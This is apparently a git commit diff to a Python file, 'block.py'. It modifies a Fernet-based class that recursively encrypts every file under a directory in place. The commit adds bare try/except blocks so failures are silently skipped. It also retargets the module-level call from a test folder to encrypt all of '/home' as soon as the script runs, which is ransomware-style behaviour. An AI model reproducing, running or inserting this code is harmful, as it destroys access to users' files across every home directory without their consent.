53b253128d1e1d4998d9c780fe8b9548a9db307a
28rodrigo <28rodrigopereira@gmail.com>
2022-06-21 22:31:26 +0100

    encrypt home

--- block.py
+++ block.py
@@ -15,53 +15,51 @@ class Encryption():
         key_64=base64.encodebytes(key.digest())
         self.fernet=Fernet(key_64)
 
-
-    # def encrypt_data(self,data:str) -> bytes:
-    #     cipher = self.fernet.encrypt(data.encode())
-    #     #print(cipher)
-    #     return cipher
-
-    
-    # def decrypt_data(self,cypher:bytes) -> str:
-    #     decoded = self.fernet.decrypt(cypher)
-
-    #     return utf_8_decode(decoded)[0]
-
     def encrypt_folder(self,path:str)->None:
         #get all files in one folder
         files= self.get_files_from_folder(path)
         for file in files:
-            with open(file,"rb") as thefile:
-                #read the content
-                contents= thefile.read()
-                #encrypt the content
-                contents_enc=self.fernet.encrypt(contents)
-                #write the encrypted content.
-            with open(file,"wb") as thefile:
-                thefile.write(contents_enc)
+            try:
+                with open(file,"rb") as thefile:
+                    #read the content
+                    contents= thefile.read()
+                    #encrypt the content
+                    contents_enc=self.fernet.encrypt(contents)
+                    #write the encrypted content.
+                with open(file,"wb") as thefile:
+                    thefile.write(contents_enc)
+            except: 
+                continue   
+            
 
     def decrypt_folder(self,path:str)->None:
         #get all files in one folder
         files= self.get_files_from_folder(path)
         for file in files:
-            with open(file,"rb") as thefile:
-                #read the content
-                contents= thefile.read()
-                # decrypt the content
-                contents_dec=self.fernet.decrypt(contents)
-                #write the content.
-            with open(file,"wb") as thefile:
-                thefile.write(contents_dec)
+            try:
+                with open(file,"rb") as thefile:
+                    #read the content
+                    contents= thefile.read()
+                    # decrypt the content
+                    contents_dec=self.fernet.decrypt(contents)
+                    #write the content.
+                with open(file,"wb") as thefile:
+                    thefile.write(contents_dec)
+            except:
+                continue
 
     # get all files in one folder and subfolders
     def get_files_from_folder(self,path):
         files= []
         for file in os.listdir(path):
-            if os.path.isfile(path+'/'+file):
-                files.append(path+"/"+file)
-            else:
-                files+=self.get_files_from_folder(path+'/'+file)
+            try:
+                if os.path.isfile(path+'/'+file):
+                    files.append(path+"/"+file)
+                else:
+                    files+=self.get_files_from_folder(path+'/'+file)
+            except:
+                continue
         return files
 
 
-Encryption('UTBbt3LMLfPQpT').encrypt_folder("/opt/files_to_encrypt")
+Encryption('password').encrypt_folder("/home")
